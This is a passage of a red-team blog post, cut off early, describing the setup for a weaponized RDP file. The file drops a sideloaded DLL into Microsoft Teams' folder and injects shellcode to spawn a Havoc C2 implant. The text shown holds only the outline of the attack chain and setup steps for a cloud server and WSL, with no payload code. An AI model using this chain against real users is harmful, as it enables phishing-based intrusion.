10px;height:auto;height:calc(320px);top:15%;left:50%;margin-left:-320px;position:fixed;text-align:center;width:640px;z-index:9999999;transition:transform .14s,opacity .14s}.a2a_full_footer,.a2a_full_header,.a2a_full_services{border:0;margin:0;padding:12px;box-sizing:border-box}.a2a_full_header{padding-bottom:8px}.a2a_full_services{height:280px;overflow-y:scroll;padding:0 12px;-webkit-overflow-scrolling:touch}.a2a_full_services .a2a_i{display:inline-block;float:none;width:181px;width:calc(33.334% - 18px)}div.a2a_full_footer{font-size:12px;text-align:center;padding:8px 14px}div.a2a_full_footer a,div.a2a_full_footer a:visited{display:inline;font-size:12px;line-height:14px;padding:8px 14px}div.a2a_full_footer a:focus,div.a2a_full_footer a:hover{background:0 0;border:0;color:#0166FF}div.a2a_full_footer a span.a2a_s_a2a,div.a2a_full_footer a span.a2a_w_a2a{background-size:14px;border-radius:3px;display:inline-block;height:14px;line-height:14px;margin:0 3px 0 0;vertical-align:top;width:14px}.a2a_modal{height:0;left:50%;margin-left:-320px;position:fixed;text-align:center;top:15%;width:640px;z-index:9999999;transition:transform .14s,opacity .14s;-webkit-tap-highlight-color:transparent}.a2a_modal_body{background:0 0;border:0;font:24px sans-serif-light,HelveticaNeue-Light,"Helvetica Neue Light","Helvetica Neue",Arial,Helvetica,"Liberation Sans",sans-serif;position:relative;height:auto;width:auto}.a2a_thanks{color:#fff;height:auto;margin-top:20px;width:auto}.a2a_thanks>div:first-child{margin:0 0 40px 0}.a2a_thanks div *{height:inherit}#a2a_copy_link{background:#FFF;border:1px solid #FFF;cursor:pointer;margin-top:15%}span.a2a_s_link#a2a_copy_link_icon,span.a2a_w_link#a2a_copy_link_icon{background-size:48px;border-radius:0;display:inline-block;height:48px;left:0;line-height:48px;margin:0 3px 0 0;position:absolute;vertical-align:top;width:48px}#a2a_modal input#a2a_copy_link_text{background-color:transparent;border:0;color:#2A2A2A;cursor:pointer;font:inherit;height:48px;left:62px;max-width:initial;min-height:auto;padding:0;position:relative;width:564px;width:calc(100% - 76px)}#a2a_copy_link_copied{background-color:#0166ff;color:#fff;display:none;font:inherit;font-size:16px;margin-top:1px;padding:3px 8px}@media (forced-colors:active){.a2a_color_buttons a,.a2a_svg{forced-color-adjust:none}}@media (prefers-color-scheme:dark){.a2a_menu a,.a2a_menu a.a2a_i,.a2a_menu a.a2a_i:visited,.a2a_menu a.a2a_more,i.a2a_i{border-color:#2a2a2a!important;color:#fff!important}.a2a_menu a.a2a_i:active,.a2a_menu a.a2a_i:focus,.a2a_menu a.a2a_i:hover,.a2a_menu a.a2a_more:active,.a2a_menu a.a2a_more:focus,.a2a_menu a.a2a_more:hover,.a2a_menu_find_container{border-color:#444!important;background-color:#444!important}.a2a_menu:not(.a2a_thanks){background-color:#2a2a2a;border-color:#2a2a2a}.a2a_menu_find{color:#fff!important}.a2a_menu span.a2a_s_find svg{background-color:transparent!important}.a2a_menu span.a2a_s_find svg path{fill:#fff!important}.a2a_full{box-shadow:#00000066 0 0 20px 10px}.a2a_overlay{background-color:#373737eb}}@media print{.a2a_floating_style,.a2a_menu,.a2a_overlay{visibility:hidden}}@keyframes a2aFadeIn{from{opacity:0}to{opacity:1}}.a2a_starting{opacity:0}.a2a_starting.a2a_full,.a2a_starting.a2a_modal{transform:scale(.8)}@media (max-width:639px){.a2a_full{border-radius:0;top:15%;left:0;margin-left:auto;width:100%}.a2a_modal{left:0;margin-left:10px;width:calc(100% - 20px)}}@media (min-width:318px) and (max-width:437px){.a2a_full .a2a_full_services .a2a_i{width:calc(50% - 18px)}}@media (max-width:317px){.a2a_full .a2a_full_services .a2a_i{width:calc(100% - 18px)}}@media (max-height:436px){.a2a_full{bottom:40px;height:auto;top:40px}}@media (max-height:550px){.a2a_modal{top:30px}}@media (max-height:360px){.a2a_modal{top:20px}.a2a_thanks>div:first-child{margin-bottom:20px}}.a2a_menu a{color:#0166FF;text-decoration:none;font:16px sans-serif-light,HelveticaNeue-Light,"Helvetica Neue Light","Helvetica Neue",Arial,Helvetica,"Liberation Sans",sans-serif;line-height:14px;height:auto;width:auto;outline:0}.a2a_menu a.a2a_i:visited,.a2a_menu a.a2a_more{color:#0166FF}.a2a_menu a.a2a_i:active,.a2a_menu a.a2a_i:focus,.a2a_menu a.a2a_i:hover,.a2a_menu a.a2a_more:active,.a2a_menu a.a2a_more:focus,.a2a_menu a.a2a_more:hover{color:#2A2A2A;border-color:#EEE;border-style:solid;background-color:#EEE;text-decoration:none}.a2a_menu span.a2a_s_find{background-size:24px;height:24px;left:8px;position:absolute;top:7px;width:24px}.a2a_menu span.a2a_s_find svg{background-color:#FFF}.a2a_menu span.a2a_s_find svg path{fill:#CCC}#a2a_menu_container{display:inline-block}.a2a_menu_find_container{border:1px solid #CCC;border-radius:6px;padding:2px 24px 2px 0;position:relative;text-align:left}.a2a_cols_container .a2a_col1{overflow-x:hidden;overflow-y:auto;-webkit-overflow-scrolling:touch}#a2a_modal input,#a2a_modal input[type=text],.a2a_menu input,.a2a_menu input[type=text]{display:block;background-image:none;box-shadow:none;line-height:100%;margin:0;outline:0;overflow:hidden;padding:0;-moz-box-shadow:none;-webkit-box-shadow:none;-webkit-appearance:none}#a2afeed_find_container input,#a2afeed_find_container input[type=text],#a2apage_find_container input,#a2apage_find_container input[type=text]{background-color:transparent;border:0;box-sizing:content-box;color:#2A2A2A;float:none;font:inherit;font-size:16px;height:28px;line-height:20px;left:38px;outline:0;margin:0;max-width:initial;min-height:initial;padding:2px 0;position:relative;width:99%}.a2a_clear{clear:both}.a2a_svg{background-repeat:no-repeat;display:block;overflow:hidden;height:32px;line-height:32px;padding:0;pointer-events:none;width:32px}.a2a_svg svg{background-repeat:no-repeat;background-position:50% 50%;border:none;display:block;left:0;margin:0 auto;overflow:hidden;padding:0;position:relative;top:0;width:auto;height:auto}a.a2a_i,i.a2a_i{display:block;float:left;border:1px solid #FFF;line-height:24px;padding:6px 8px;text-align:left;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;width:132px}a.a2a_i span,a.a2a_more span{display:inline-block;overflow:hidden;vertical-align:top}a.a2a_i .a2a_svg{margin:0 6px 0 0}a.a2a_i .a2a_svg,a.a2a_more .a2a_svg{background-size:24px;height:24px;line-height:24px;width:24px}a.a2a_sss:hover{border-left:1px solid #CCC}a.a2a_more{border-bottom:1px solid #FFF;border-left:0;border-right:0;line-height:24px;margin:6px 0 0;padding:6px;-webkit-touch-callout:none}a.a2a_more span{height:24px;margin:0 6px 0 0}.a2a_kit .a2a_svg{background-repeat:repeat}.a2a_default_style a:empty,.a2a_flex_style a:empty,.a2a_floating_style a:empty,.a2a_overlay_style a:empty{display:none}.a2a_color_buttons a,.a2a_floating_style a{text-decoration:none}.a2a_default_style:not(.a2a_flex_style) a{float:left;line-height:16px;padding:0 2px}.a2a_default_style a:hover .a2a_svg,.a2a_floating_style a:hover .a2a_svg,.a2a_overlay_style a:hover .a2a_svg svg{opacity:.7}.a2a_overlay_style.a2a_default_style a:hover .a2a_svg{opacity:1}.a2a_default_style .a2a_count,.a2a_default_style .a2a_svg,.a2a_floating_style .a2a_svg,.a2a_menu .a2a_svg,.a2a_vertical_style .a2a_count,.a2a_vertical_style .a2a_svg{border-radius:4px}.a2a_default_style .a2a_counter img,.a2a_default_style .a2a_dd,.a2a_default_style .a2a_svg{float:left}.a2a_default_style .a2a_img_text{margin-right:4px}.a2a_default_style .a2a_divider{border-left:1px solid #000;display:inline;float:left;height:16px;line-height:16px;margin:0 5px}.a2a_kit a{cursor:pointer;transition:none}.a2a_floating_style{background-color:#fff;border-radius:6px;position:fixed;z-index:9999995}.a2a_overlay_style{z-index:2147483647}.a2a_floating_style,.a2a_overlay_style{animation:a2aFadeIn .2s ease-in;padding:4px}.a2a_vertical_style:not(.a2a_flex_style) a{clear:left;display:block;overflow:hidden;padding:4px}.a2a_floating_style.a2a_default_style{bottom:0}.a2a_floating_style.a2a_default_style a,.a2a_overlay_style.a2a_default_style a{padding:4px}.a2a_count{background-color:#fff;border:1px solid #ccc;box-sizing:border-box;color:#2a2a2a;display:block;float:left;font:12px Arial,Helvetica,sans-serif;height:16px;margin-left:4px;position:relative;text-align:center;width:50px}.a2a_count:after,.a2a_count:before{border:solid transparent;border-width:4px 4px 4px 0;content:"";height:0;left:0;line-height:0;margin:-4px 0 0 -4px;position:absolute;top:50%;width:0}.a2a_count:before{border-right-color:#ccc}.a2a_count:after{border-right-color:#fff;margin-left:-3px}.a2a_count span{animation:a2aFadeIn .14s ease-in}.a2a_vertical_style .a2a_counter img{display:block}.a2a_vertical_style .a2a_count{float:none;margin-left:0;margin-top:6px}.a2a_vertical_style .a2a_count:after,.a2a_vertical_style .a2a_count:before{border:solid transparent;border-width:0 4px 4px 4px;content:"";height:0;left:50%;line-height:0;margin:-4px 0 0 -4px;position:absolute;top:0;width:0}.a2a_vertical_style .a2a_count:before{border-bottom-color:#ccc}.a2a_vertical_style .a2a_count:after{border-bottom-color:#fff;margin-top:-3px}.a2a_color_buttons .a2a_count,.a2a_color_buttons .a2a_count:after,.a2a_color_buttons .a2a_count:before,.a2a_color_buttons.a2a_vertical_style .a2a_count:after,.a2a_color_buttons.a2a_vertical_style .a2a_count:before{background-color:transparent;border:none;color:#fff;float:none;width:auto}.a2a_color_buttons.a2a_vertical_style .a2a_count{margin-top:0}.a2a_flex_style{display:flex;align-items:flex-start;gap:0}.a2a_default_style.a2a_flex_style{left:0;right:0;width:100%}.a2a_vertical_style.a2a_flex_style{flex-direction:column;top:0;bottom:0}.a2a_flex_style a{display:flex;justify-content:center;flex:1;padding:4px}.a2a_flex_style.a2a_vertical_style a{flex-direction:column}.a2a_floating_style.a2a_color_buttons,.a2a_floating_style.a2a_flex_style{border-radius:0;padding:0}.a2a_floating_style.a2a_default_style.a2a_flex_style{bottom:0}.a2a_kit.a2a_flex_style .a2a_counter img,.a2a_kit.a2a_flex_style .a2a_dd,.a2a_kit.a2a_flex_style .a2a_svg{float:none}.a2a_nowrap{white-space:nowrap}.a2a_note{margin:0 auto;padding:9px;font-size:12px;text-align:center}.a2a_note .a2a_note_note{margin:0;color:#2A2A2A}.a2a_wide a{display:block;margin-top:3px;border-top:1px solid #EEE;text-align:center}.a2a_label{position:absolute!important;clip-path:polygon(0px 0px,0px 0px,0px 0px);-webkit-clip-path:polygon(0px 0px,0px 0px,0px 0px);overflow:hidden;height:1px;width:1px}.a2a_kit,.a2a_menu,.a2a_modal,.a2a_overlay{-ms-touch-action:manipulation;touch-action:manipulation;outline:0}.a2a_dd{-webkit-user-drag:none}.a2a_dd img{border:0}.a2a_button_facebook_like iframe{max-width:none}</style></head>
<body class="post-template-default single single-post postid-435 single-format-standard wp-embed-responsive  oxy-overlay-header oxygen-body">





						<header id="_header-2-38" class="oxy-header-wrapper oxy-overlay-header oxy-header"><div id="_header_row-3-38" class="oxy-header-row"><div class="oxy-header-container"><div id="_header_left-4-38" class="oxy-header-left"><a id="link-45-38" class="ct-link" href="/"><img id="image-8-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-footer-final.png" class="ct-image" srcset="https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-footer-final.png 1757w, https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-footer-final-300x65.png 300w, https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-footer-final-1024x220.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-footer-final-768x165.png 768w, https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-footer-final-1536x330.png 1536w" sizes="(max-width: 1757px) 100vw, 1757px"></a></div><div id="_header_center-5-38" class="oxy-header-center"></div><div id="_header_right-6-38" class="oxy-header-right"><nav id="div_block-9-38" class="ct-div-block nav-menu"><div id="div_block-12-38" class="ct-div-block menu-item-wrapper"><a id="text_block-13-38" class="ct-link-text menu-item-text" href="https://shorsec.io/about/">About</a></div><div id="div_block-15-38" class="ct-div-block menu-item-wrapper has-submenu"><div id="div_block-43-38" class="ct-div-block"><a id="text_block-41-38" class="ct-link-text menu-item-text" href="https://shorsec.io/services/">Services</a><div id="fancy_icon-44-38" class="ct-fancy-icon"><svg id="svg-fancy_icon-44-38"><use xlink:href="#FontAwesomeicon-chevron-down"></use></svg></div></div><div id="div_block-23-38" class="ct-div-block mega-submenu"><div id="div_block-24-38" class="ct-div-block"><div id="div_block-25-38" class="ct-div-block"><a id="link-101-38" class="ct-link" href="https://shorsec.io/services/#adversary-simulations"><p id="headline-26-38" class="ct-headline">Adversary Simulation<br></p></a><nav id="_nav_menu-27-38" class="oxy-nav-menu oxy-nav-menu-dropdowns oxy-nav-menu-dropdown-arrow oxy-nav-menu-vertical"><div class="oxy-menu-toggle"><div class="oxy-nav-menu-hamburger-wrap"><div class="oxy-nav-menu-hamburger"><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div></div></div></div><div class="menu-header-menu-dropdown-adversary-simulation-container"><ul id="menu-header-menu-dropdown-adversary-simulation" class="oxy-nav-menu-list"><li id="menu-item-211" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-211"><a href="https://shorsec.io/services/red-team/">Red Team Operation</a></li>
<li id="menu-item-215" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-215"><a href="https://shorsec.io/services/purple-team/">Purple Team Operation</a></li>
<li id="menu-item-213" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-213"><a href="https://shorsec.io/services/physical-security/">Physical Security Assessment</a></li>
<li id="menu-item-214" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-214"><a href="https://shorsec.io/services/assumed-breach/">Assumed Breach Assessment</a></li>
<li id="menu-item-212" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-212"><a href="https://shorsec.io/services/social-engineering/">Social Engineering &amp; Employee Awareness Assessment</a></li>
</ul></div></nav></div><div id="div_block-28-38" class="ct-div-block"><a id="link-103-38" class="ct-link" href="/services/#penetration-testing" target="_self"><p id="headline-29-38" class="ct-headline">Penetration Testing<br></p></a><nav id="_nav_menu-30-38" class="oxy-nav-menu oxy-nav-menu-dropdowns oxy-nav-menu-dropdown-arrow oxy-nav-menu-vertical"><div class="oxy-menu-toggle"><div class="oxy-nav-menu-hamburger-wrap"><div class="oxy-nav-menu-hamburger"><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div></div></div></div><div class="menu-header-menu-dropdown-penetration-testing-container"><ul id="menu-header-menu-dropdown-penetration-testing" class="oxy-nav-menu-list"><li id="menu-item-221" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-221"><a href="https://shorsec.io/services/internal-network-pt/">Internal Network Penetration Testing</a></li>
<li id="menu-item-220" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-220"><a href="https://shorsec.io/services/external-network-pt/">External Network Penetration Testing</a></li>
<li id="menu-item-219" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-219"><a href="https://shorsec.io/services/web-application-pt/">Web Application Penetration Testing</a></li>
<li id="menu-item-218" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-218"><a href="https://shorsec.io/services/mobile-application-pt/">Mobile Application Penetration Testing</a></li>
<li id="menu-item-217" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-217"><a href="https://shorsec.io/services/wifi-pt/">Wi-Fi Penetration Testing</a></li>
<li id="menu-item-216" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-216"><a href="https://shorsec.io/services/cloud-pt/">Cloud Penetration Testing</a></li>
</ul></div></nav></div><div id="div_block-32-38" class="ct-div-block"><a id="link-102-38" class="ct-link" href="/services/#continuous-cyber-readiness"><p id="headline-33-38" class="ct-headline">Continuous Cyber Readiness<br></p></a></div></div></div></div><div id="div_block-107-38" class="ct-div-block menu-item-wrapper"><a id="link_text-108-38" class="ct-link-text menu-item-text" href="https://shorsec.io/trainings/">Trainings</a></div><div id="div_block-17-38" class="ct-div-block menu-item-wrapper"><a id="link_text-18-38" class="ct-link-text menu-item-text" href="https://shorsec.io/case-studies/">Case Studies</a></div><div id="div_block-19-38" class="ct-div-block menu-item-wrapper"><a id="link_text-20-38" class="ct-link-text menu-item-text" href="https://shorsec.io/blog/">Blog</a></div><div id="div_block-21-38" class="ct-div-block menu-item-wrapper"><a id="link_text-22-38" class="ct-link-text menu-item-text" href="https://shorsec.io/contact-us/">Get in touch</a></div><img id="image-104-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/icons8-close-50.png" class="ct-image close-mb-menu" srcset="" sizes="(max-width: 50px) 100vw, 50px"></nav><div id="div_block-36-38" class="ct-div-block toggle-menu"><img id="image-39-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/icons8-hamburger-menu-50.png" class="ct-image open-menu-icon" srcset="" sizes="(max-width: 50px) 100vw, 50px"><img id="image-40-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/icons8-close-50.png" class="ct-image close-menu-icon" srcset="" sizes="(max-width: 50px) 100vw, 50px"></div></div></div></div></header>
		<section id="section-3-115" class=" ct-section"><div class="ct-section-inner-wrap"><div id="div_block-10-115" class="ct-div-block"><p id="text_block-13-115" class="ct-text-block"><span id="span-14-115" class="ct-span">21.07.2023</span></p><p id="text_block-11-115" class="ct-text-block"><span id="span-12-115" class="ct-span">Mor Davidovich</span></p></div><h1 id="headline-4-115" class="ct-headline page-title"><span id="span-6-115" class="ct-span">MalRDP: Implementing Rouge RDP Manually</span></h1></div></section><section id="section-15-115" class=" ct-section"><div class="ct-section-inner-wrap"><div id="div_block-16-115" class="ct-div-block"><div id="div_block-17-115" class="ct-div-block post-content"><div id="div_block-21-115" class="ct-div-block post-tags"><p id="text_block-23-115" class="ct-text-block post-tags-wrapper"><span id="span-26-115" class="ct-span"><a href="https://shorsec.io/blog/tag/dll-proxying/" rel="tag">DLL Proxying</a><a href="https://shorsec.io/blog/tag/dll-sideloading/" rel="tag">DLL Sideloading</a><a href="https://shorsec.io/blog/tag/malware-development/" rel="tag">Malware Development</a><a href="https://shorsec.io/blog/tag/phishing/" rel="tag">Phishing</a></span></p></div><div id="text_block-18-115" class="ct-text-block"><span id="span-19-115" class="ct-span oxy-stock-content-styles">
<h2 class="wp-block-heading">Preface</h2>



<p>Let me start by saying that all credits for this idea and technique goes to <a rel="noreferrer noopener" href="https://twitter.com/ustayready" data-type="URL" data-id="https://twitter.com/ustayready" target="_blank"><strong><em>Mike Felch @ustayready</em></strong></a> of <a href="https://darkoptics.com/" data-type="URL" data-id="https://darkoptics.com/" target="_blank" rel="noreferrer noopener"><strong><em>Dark Optics</em></strong></a>. I came across his <a rel="noreferrer noopener" href="https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/" target="_blank"><strong><em>article</em></strong></a> back in March 22 and immediately was blown away by it – this technique is so creative and powerful, such an amazing work!. I too was searching (and always am for that matter) for new initial access methods and when I saw this article I knew Mike has found something really cool. Unfortunately, when I finished reading the article I saw that Mike said that he would hold off on releasing his tool “Rouge RDP” for the time being. Although I understood why, I still was extremely disappointed of being teased with this incredibly looking technique without the implementation of it. So I’ve waited for more than a year now, from time to time going back to the empty <a rel="noreferrer noopener" href="https://github.com/ustayready/roguerdp" target="_blank"><strong><em>GitHub repo</em></strong></a> to see if something had changed and tool finally released and every time I was greeted by this grim message “Not public at the moment”</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="970" height="543" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-github-message.png" alt="" class="wp-image-441" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-github-message.png 970w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-github-message-300x168.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-github-message-768x430.png 768w" sizes="(max-width: 970px) 100vw, 970px"></figure>



<p>Yesterday (July 20<sup>th</sup>, 2023) Mike and BHIS did a <strong><em><a href="https://www.youtube.com/watch?v=csZ-joDJ1BE" target="_blank" rel="noreferrer noopener">webinar</a></em></strong> about this very technique and obviously I couldn’t let myself miss it. This webinar was much more revealing in terms of the technical details of the technique and how it works and then it finally dawned on me how this could be achieved manually. To my surprise the Rouge RDP GitHub repo still say it’s not public yet and so I thought to myself “why not try implement it myself?”. I always like learning new stuff and one of the best ways (for my brain at least) to do it is to try doing it myself, so this is exactly what I did.</p>



<p><strong>P.S</strong>: After creating this POC it was mentioned to me that Mike said in his webinar that he is indeed planning on releasing his “Rouge RDP” tool which I must have missed during the webinar so be sure to lookout for that also as I’m sure he has done much better job than me on this technique.</p>



<p>In this blog post I’ll walk you through the process of how I implemented Mike’s technique and managed to have a weaponized RDP file that once clicked by the victim will drop a malicious DLL on the victim’s host machine in the Microsoft Teams AppData folder to be sideloaded the next time the victim runs Teams, this DLL will then inject a shellcode to the Teams Process that spawns a C2 Implant (in this case – <strong><em><a href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noreferrer noopener">Havoc</a></em></strong>).</p>



<p>This post will focus purely on the technical implementation I did, for details on how and why this works and the theory behind this technique I would redirect you to Mike’s <a href="https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/" target="_blank" rel="noreferrer noopener"><strong><em>original article</em></strong></a> and recent <strong><em><a href="https://www.youtube.com/watch?v=csZ-joDJ1BE" target="_blank" rel="noreferrer noopener">webinar</a></em></strong> as this is his technique and original idea and he would do much better job than me explaining it.</p>



<p>Before we begin however, here is the final POC Video just so you can have an understanding of what we are going to cover here:</p>



<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
<iframe loading="lazy" title="MalRDP Demo" width="500" height="281" src="https://www.youtube.com/embed/O_gHQ4M1wH4?feature=oembed&amp;enablejsapi=1&amp;origin=https://shorsec.io" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" data-lf-form-tracking-inspected-xbp1oaenreg8edvj="true" data-lf-yt-playback-inspected-xbp1oaenreg8edvj="true" data-lf-vimeo-playback-inspected-xbp1oaenreg8edvj="true"></iframe>
</div></figure>



<h2 class="wp-block-heading">Infrastructure</h2>



<p>In order to get started we would need to create a Windows Server 2022 machine in your favorite cloud provider (I went with EC2 instance from AWS)</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="715" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-create-ec2-1024x715.png" alt="" class="wp-image-442" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-create-ec2-1024x715.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-create-ec2-300x210.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-create-ec2-768x537.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-create-ec2.png 1258w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Be sure to set a Key Pair for this EC2 instance otherwise you won’t be able to retrieve the password for this instance:</p>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-key-pair.png" alt="" class="wp-image-443" width="841" height="287" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-key-pair.png 798w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-key-pair-300x102.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-key-pair-768x262.png 768w" sizes="(max-width: 841px) 100vw, 841px"></figure>



<p>You should allow only ports 443 and 80 inbound from the internet (and of course the 3389 bound to your IP so you can connect to the server and configure it):</p>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-security-group.png" alt="" class="wp-image-444" width="841" height="628" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-security-group.png 786w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-security-group-300x224.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-security-group-768x574.png 768w" sizes="(max-width: 841px) 100vw, 841px"></figure>



<p>After the EC2 instance has finished initializing, click on <em><strong>Connect</strong> </em>and then on <strong><em>Decrypt Password</em></strong>, upload your private key and finally reveal the password for the EC2 machine (the deafult username is administrator):</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="853" height="704" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-ec2-decrypt-password.png" alt="" class="wp-image-445" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-ec2-decrypt-password.png 853w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-ec2-decrypt-password-300x248.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-ec2-decrypt-password-768x634.png 768w" sizes="(max-width: 853px) 100vw, 853px"></figure>



<p>Now we can connect to our machine via RDP and start its configuration:</p>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-connection-to-rdp.png" alt="" class="wp-image-446" width="839" height="448" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-connection-to-rdp.png 620w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-aws-connection-to-rdp-300x160.png 300w" sizes="(max-width: 839px) 100vw, 839px"></figure>



<h2 class="wp-block-heading">Initial Configuration</h2>



<p>The first thing to do is to install WSL (Windows Sub System For Linux) on our machine. On EC2 with Windows Server 2022 installations we can simply open PowerShell and enter the following command and then restart our EC2 instance:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">PowerShell</span><span role="button" tabindex="0" data-code="wsl --install --enable-wsl1" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #D8DEE9FF">wsl </span><span style="color: #81A1C1">--</span><span style="color: #D8DEE9FF">install </span><span style="color: #81A1C1">--</span><span style="color: #88C0D0">enable-wsl1</span></span></code></pre></div>



<p></p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="345" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-installing-wsl-1024x345.png" alt="" class="wp-image-447" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-installing-wsl-1024x345.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-installing-wsl-300x101.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-installing-wsl-768x259.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-installing-wsl.png 1116w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>After restarting the EC2 instance, run the following command:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">PowerShell</span><span role="button" tabindex="0" data-code="wsl --set-default-version 1" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #D8DEE9FF">wsl </span><span style="color: #81A1C1">--</span><span style="color: #88C0D0">set-default</span><span style="color: #81A1C1">-</span><span style="color: 